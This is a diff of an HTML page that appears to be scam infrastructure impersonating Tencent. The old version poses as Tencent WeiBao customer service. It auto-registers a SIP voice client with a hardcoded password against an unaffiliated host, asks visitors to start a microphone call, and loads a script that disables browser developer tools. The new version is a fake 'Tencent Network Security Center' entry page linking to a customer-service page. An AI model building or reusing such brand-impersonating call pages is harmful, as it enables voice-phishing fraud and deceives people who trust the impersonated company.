@@ -2,244 +2,37 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>腾讯微保在线客服</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>腾讯网络安全中心 - 入口</title>
   <style>
-    :root {
-      --main-blue: #2685fa;
-      --main-blue-dark: #1756a9;
-      --main-blue-light: #eaf3fe;
-      --main-gray: #f5f7fa;
-      --main-font: 'PingFang SC', 'Microsoft YaHei', Arial, sans-serif;
-      --border-radius: 14px;
-    }
     body {
-      font-family: var(--main-font);
-      background: linear-gradient(135deg, var(--main-blue-light) 0%, #fff 100%);
-      min-height: 100vh;
+      font-family: 'PingFang SC', 'Microsoft YaHei', Arial, sans-serif;
+      background: #f0f4ff;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
       margin: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
     }
-    .logo-box {
-      margin-top: 36px;
-      margin-bottom: 18px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .logo-box img {
-      height: 60px;
-      margin-bottom: 10px;
-    }
-    .main-content {
-      background: #fff;
-      box-shadow: 0 4px 24px 0 rgba(38,133,250,0.10);
-      border-radius: var(--border-radius);
-      padding: 36px 32px 32px 32px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-width: 340px;
-      max-width: 96vw;
-      margin-bottom: 28px;
-    }
-    .profile-avatar {
-      width: 64px;
-      height: 64px;
-      border-radius: 50%;
-      object-fit: cover;
-      box-shadow: 0 2px 8px rgba(38,133,250,0.15);
-      border: 2px solid var(--main-blue-light);
-      margin-bottom: 18px;
-      margin-top: -10px;
-      background: #fff;
-    }
-    h1 {
-      font-size: 28px;
-      color: var(--main-blue-dark);
-      margin: 0 0 26px 0;
-      letter-spacing: 2px;
-      font-weight: 700;
-    }
-    #hangupButton {
-      padding: 16px 44px;
-      font-size: 20px;
-      margin: 12px 10px;
+    button {
+      background: #2685fa;
+      color: #fff;
+      font-size: 24px;
+      padding: 16px 40px;
       border: none;
-      border-radius: 28px;
+      border-radius: 12px;
       cursor: pointer;
-      font-weight: 600;
-      box-shadow: 0 2px 6px rgba(38,133,250,0.08);
-      background: linear-gradient(90deg, #ee4747 0%, #ff8888 100%);
-      color: #fff;
-      transition: background 0.2s, box-shadow 0.2s;
-      outline: none;
+      box-shadow: 0 4px 12px rgba(38,133,250,0.4);
+      transition: background-color 0.3s ease;
     }
-    #hangupButton:disabled {
-      background: #ffcccc;
-      color: #fff;
-      cursor: not-allowed;
-    }
-    #callStatus {
-      font-size: 17px;
-      margin-top: 16px;
-      color: var(--main-blue-dark);
-      letter-spacing: 1px;
-    }
-    .footer {
-      margin-top: 30px;
-      font-size: 16px;
-      color: #666;
-      text-align: center;
-      line-height: 1.8;
-      width: 100%;
-      max-width: 460px;
-      padding: 0 14px 40px 14px;
-    }
-    .footer strong {
-      color: var(--main-blue-dark);
-    }
-    @media (max-width: 500px) {
-      .main-content {
-        padding: 22px 6vw 18px 6vw;
-        min-width: unset;
-      }
-      h1 {
-        font-size: 22px;
-      }
-      #hangupButton {
-        width: 92vw;
-        min-width: 0;
-        font-size: 17px;
-        margin: 10px 0;
-      }
-      .profile-avatar {
-        width: 48px;
-        height: 48px;
-      }
+    button:hover {
+      background: #1756a9;
     }
   </style>
 </head>
 <body>
-  <div class="logo-box">
-    <img src="https://static.weibocdn.com/assets/img/brand/webao_logo_blue.svg" alt="腾讯微保LOGO" onerror="this.style.display='none'">
-  </div>
 
-  <div class="main-content">
-    <h1>腾讯微保在线客服</h1>
-    <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
-    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
-    <div id="callStatus">正在连接客服，请稍候...</div>
-    <audio id="audioRemote" autoplay></audio>
-  </div>
+  <button onclick="location.href='kefu.html'">连接客服</button>
 
-  <div class="footer">
-    <strong>温馨提示：</strong><br>
-    页面打开后将自动连接客服，请确保麦克风权限已开启。<br>
-    如需结束，请点击“挂断”。服务时间：9:00-21:00（节假日无休）<br>
-    <span style="color:#a3a3a3;font-size:13px;display:block;margin-top:8px;">© 2025 腾讯微保 版权所有</span>
-  </div>
-
-  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
-  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
-      const configuration = {
-        sockets: [socket],
-        uri: 'sip:1002020@xin.anjre.cn',
-        password: 'Aa6363463@',
-        display_name: '腾讯微保网页客户',
-        session_timers: false,
-        register: true
-      };
-
-      const ua = new JsSIP.UA(configuration);
-      let session = null;
-      let isCalling = false;
-
-      const statusDisplay = document.getElementById('callStatus');
-      const remoteAudio = document.getElementById('audioRemote');
-      const hangupButton = document.getElementById('hangupButton');
-
-      function updateStatus(text) {
-        statusDisplay.textContent = text;
-      }
-
-      function makeCall() {
-        if (isCalling) return;
-        isCalling = true;
-        hangupButton.disabled = false;
-        updateStatus("正在呼叫客服，请稍候...");
-
-        session = ua.call('sip:999999@xin.anjre.cn', {
-          mediaConstraints: { audio: true, video: false },
-          rtcOfferConstraints: {
-            offerToReceiveAudio: 1,
-            offerToReceiveVideo: 0
-          }
-        });
-
-        session.connection.addEventListener('addstream', function (e) {
-          remoteAudio.srcObject = e.stream;
-          remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
-        });
-
-        session.on('progress', () => updateStatus("正在为您接通客服..."));
-        session.on('accepted', () => updateStatus("客服通话中"));
-        session.on('ended', () => {
-          updateStatus("通话已结束，感谢您的使用！");
-          resetUI();
-        });
-        session.on('failed', (e) => {
-          updateStatus("呼叫失败，请稍后重试");
-          console.error('呼叫失败:', e);
-          resetUI();
-        });
-      }
-
-      function resetUI() {
-        isCalling = false;
-        hangupButton.disabled = true;
-        session = null;
-      }
-
-      window.hangupCall = function () {
-        if (session) session.terminate();
-      };
-
-      ua.on('connected', () => console.log('✅ SIP WebSocket 已连接'));
-      ua.on('registered', () => {
-        console.log('✅ 注册成功，等待用户点击授权');
-        const overlay = document.createElement('div');
-        overlay.style.position = 'fixed';
-        overlay.style.top = 0;
-        overlay.style.left = 0;
-        overlay.style.width = '100vw';
-        overlay.style.height = '100vh';
-        overlay.style.backgroundColor = 'rgba(0,0,0,0.6)';
-        overlay.style.display = 'flex';
-        overlay.style.alignItems = 'center';
-        overlay.style.justifyContent = 'center';
-        overlay.style.zIndex = 9999;
-        overlay.innerHTML = `<button style="padding: 20px 40px; font-size: 22px; border: none; border-radius: 12px; background: #2685fa; color: #fff; cursor: pointer;">点击开始通话</button>`;
-        document.body.appendChild(overlay);
-
-        overlay.querySelector('button').addEventListener('click', () => {
-          makeCall();
-          document.body.removeChild(overlay);
-        });
-      });
-
-      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
-      ua.on('disconnected', () => console.warn('❗️ SIP 连接断开'));
-
-      ua.start();
-    });
-  </script>
 </body>
 </html>
